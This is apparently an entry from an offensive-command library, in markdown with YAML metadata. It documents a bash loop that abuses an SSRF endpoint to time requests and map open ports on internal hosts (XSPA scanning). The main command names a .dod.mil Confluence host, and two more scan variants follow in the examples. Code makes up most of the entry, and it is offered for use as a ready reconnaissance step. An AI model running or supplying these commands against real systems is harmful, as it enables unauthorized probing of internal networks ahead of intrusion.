---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
data: >-
  for port in {22,80,443,3389,445}; do start_time=$(date +%s%N); curl -s
  --max-time 10
  "https://target-confluence.dod.mil/ssrf-endpoint?target=internal-ip:$port" >
  /dev/null; end_time=$(date +%s%N); echo "Port $port: $(( (end_time -
  start_time) / 1000000 )) ms"; done
tags:
  - xspa
  - scanning
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:13.104Z'
verified: false
validated: true
submitted: true
---
# curl-timing-scan

## Command

```bash
for port in {22,80,443,3389,445}; do start_time=$(date +%s%N); curl -s --max-time 10 "https://target-confluence.dod.mil/ssrf-endpoint?target=internal-ip:$port" > /dev/null; end_time=$(date +%s%N); echo "Port $port: $(( (end_time - start_time) / 1000000 )) ms"; done
```

## Description

Loops through ports, measures response times via SSRF to perform XSPA scanning, identifying open ports based on delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for port in {...}` | List of ports to scan | Yes |
| `date +%s%N` | Nanosecond timing | Yes |
| `curl -s --max-time 10` | Silent curl with timeout | Yes |
| URL | SSRF endpoint with port param | Yes |

## Examples

### Basic Usage

```bash
for p in {1..1000}; do time curl -s "target.com?port=$p"; done
```

### Advanced Usage

```bash
for port in 22 80 443; do /usr/bin/time -f "%e" curl -s "target?ip=internal:$port" > /dev/null; done
```

## Expected Output

Timestamps like "Port 22: 5000 ms" (delayed for open), "Port 81: 100 ms" (closed).

## Related

- [[Related Procedure]]
